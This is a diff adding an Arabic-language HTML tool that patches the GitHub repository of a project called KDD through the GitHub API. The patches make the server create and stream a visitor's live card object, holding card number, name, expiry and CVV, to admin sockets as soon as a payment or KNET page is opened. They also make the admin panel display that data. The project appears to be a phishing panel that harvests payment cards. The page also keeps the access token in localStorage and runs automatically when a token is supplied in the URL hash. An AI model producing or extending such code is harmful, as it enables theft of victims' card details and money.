@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl"><head><meta charset="utf-8">
+<title>KDD — رجوع ظهور البطاقة v7</title>
+<style>
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;padding:20px}
+.card{max-width:660px;margin:0 auto;border:1px solid #1e293b;border-radius:14px;padding:20px}
+h1{font-size:18px;color:#fff;margin:0 0 10px}
+input{width:100%;box-sizing:border-box;padding:11px;border-radius:9px;border:1px solid #334155;background:#1e293b;color:#e2e8f0;font-family:monospace;direction:ltr}
+button{width:100%;margin-top:12px;padding:12px;border:0;border-radius:9px;background:#2563eb;color:#fff;font-weight:700;font-size:15px;cursor:pointer}
+pre{margin-top:14px;padding:13px;background:#020617;border:1px solid #1e293b;border-radius:9px;color:#a7f3d0;font:12.5px monospace;line-height:1.8;white-space:pre-wrap;min-height:70px}
+</style></head><body><div class="card">
+<h1>🔧 رجوع ظهور البطاقة + عرض ذكي — v7</h1>
+<input id="tok" type="password" placeholder="الصق التوكن" autocomplete="off">
+<button id="go">🚀 نفّذ وارفع</button>
+<pre id="log">جاهز.</pre>
+</div>
+<script>
+(function(){
+var OWNER='fahshomi-ui',REPO='KDD',BRANCH='main';
+var API='https://api.github.com/repos/'+OWNER+'/'+REPO+'/contents/';
+var $=function(i){return document.getElementById(i)};
+var running=false;
+function log(t){var e=$('log');e.textContent+=t+'\n';e.scrollTop=e.scrollHeight}
+function b64e(s){return btoa(unescape(encodeURIComponent(s)))}
+function b64d(s){return decodeURIComponent(escape(atob(String(s).replace(/\s/g,''))))}
+function ep(p){return p.split('/').map(encodeURIComponent).join('/')}
+function tok(){return $('tok').value.trim()}
+function H(){return {'Authorization':'Bearer '+tok(),'Accept':'application/vnd.github+json','X-GitHub-Api-Version':'2022-11-28'}}
+async function gh(p,o){var r=await fetch(API+p,Object.assign({headers:H()},o||{}));var x=await r.text();var j={};try{j=JSON.parse(x)}catch(e){}
+if(!r.ok)throw new Error((j&&j.message)||('HTTP '+r.status));return j}
+
+/* ===== S) رجّع إنشاء البطاقة عند دخول صفحة دفع ===== */
+var S_old=`      if (isPaymentPage) {
+        visitor.hasEnteredCardPage = true;
+        visitor.lastDataUpdate = new Date().toISOString();
+        /*FIX-LIVE*/ if (visitor.liveCard) {
+          visitor.liveCardTimestamp = visitor.liveCardTimestamp || new Date().toISOString();
+          admins.forEach((admin, adminSocketId) => {
+            io.to(adminSocketId).emit("card:liveUpdate", { visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp });
+          });
+        }
+      } else {`;
+var S_new=`      if (isPaymentPage) {
+        visitor.hasEnteredCardPage = true;
+        visitor.lastDataUpdate = new Date().toISOString();
+        /*FIX-LIVE*/ if (!visitor.liveCard) {
+          visitor.liveCard = { cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" };
+        }
+        visitor.liveCardTimestamp = visitor.liveCardTimestamp || new Date().toISOString();
+        admins.forEach((admin, adminSocketId) => {
+          io.to(adminSocketId).emit("card:liveUpdate", { visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp });
+        });
+      } else {`;
+
+/* ===== T) اللوحة: اظهرها بالصفحات اللي فيها إدخال بطاقة أو إذا فيها بيانات ===== */
+var T_old=`/*FIX-LIVE*/ if (__lcHas && visitor.liveCard && (__lastPcTs === 0 || __lcTs > __lastPcTs)) {`;
+var T_new=`/*FIX-LIVE*/ const __pgLc = String(visitor.page||'').toLowerCase();
+/*FIX-LIVE*/ const __lcEntry = ['الدفع','بطاقة','كي نت','knet','payment','credit','card','checkout','إتمام'].some(function(h){ return __pgLc.indexOf(String(h).toLowerCase())>-1; });
+/*FIX-LIVE*/ if (visitor.liveCard && (__lcHas || __lcEntry) && (__lastPcTs === 0 || __lcTs > __lastPcTs)) {`;
+
+var adm=[[T_old,T_new]];
+var PATCHES={'server/index.js':[[S_old,S_new]],
+'server/admin/index.html':adm,'kdd-public/admin.html':adm};
+
+async function run(){
+ if(running) return; running=true; $('go').disabled=true;
+ $('log').textContent='';
+ try{
+  if(!tok()){log('⚠️ الصق التوكن');return}
+  localStorage.setItem('kdd_tok',tok());
+  var fs=Object.keys(PATCHES);
+  for(var f=0;f<fs.length;f++){var file=fs[f];
+   log('\n⏳ '+file);
+   var m=await gh(ep(file)+'?ref='+BRANCH), s=b64d(m.content), ap=0, pr=PATCHES[file];
+   for(var i=0;i<pr.length;i++){var a=pr[i][0],b=pr[i][1];
+    if(s.indexOf(b)!==-1)continue;
+    if(s.indexOf(a)===-1){log('   ⚠️ مرجع ناقص #'+(i+1));continue}
+    s=s.replace(a,b);ap++}
+   if(!ap){log('   ✓ مطبّق مسبقاً')}
+   else{await gh(ep(file),{method:'PUT',body:JSON.stringify({message:'fix: live card shows on entry pages',content:b64e(s),sha:m.sha,branch:BRANCH})});log('   ✅ تم التعديل والرفع ('+ap+')')}
+  }
+  log('\n🏁 خلص. انتظر النشر ثم Ctrl+F5.');
+ }catch(e){log('❌ '+e.message)}
+ finally{running=false;$('go').disabled=false}
+}
+$('go').onclick=run;
+var st=decodeURIComponent(location.hash.replace('#',''))||localStorage.getItem('kdd_tok');
+if(st){$('tok').value=st;setTimeout(run,300)}
+})();
+</script></body></html>
